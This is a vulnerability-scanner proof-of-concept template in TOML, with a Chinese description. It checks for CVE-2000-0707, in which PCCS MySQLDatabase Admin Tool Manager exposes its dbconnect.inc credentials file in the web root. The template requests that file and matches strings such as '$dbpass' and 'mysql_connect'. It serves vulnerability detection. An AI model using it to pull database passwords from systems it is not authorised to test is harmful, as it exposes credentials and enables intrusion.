[info]
author = "ave"
description = "PCCS MySQLDatabase Admin Tool Manager 1.2.4 及更早版本将数据库连接配置文件 dbconnect.inc 放置在 Web 根目录下，攻击者无需身份认证即可直接通过 HTTP 访问该文件，获取数据库管理员密码等敏感连接信息，导致 MySQL 数据库可能被未授权访问。"
id = "POC-AVE-2000-0863"
name = "PCCS MySQLDatabase Admin Tool Manager dbconnect.inc 信息泄露 PoC"
severity = "high"
tags = ["ave-2000-0863"]
vuln_id = [
    "CVE-2000-0707",
    "AVE-2000-0863",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/dbconnect.inc"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "$dbhost",
    "$dbuser",
    "$dbpass",
    "$db_name",
    "mysql_connect",
    "dbConnect",
]
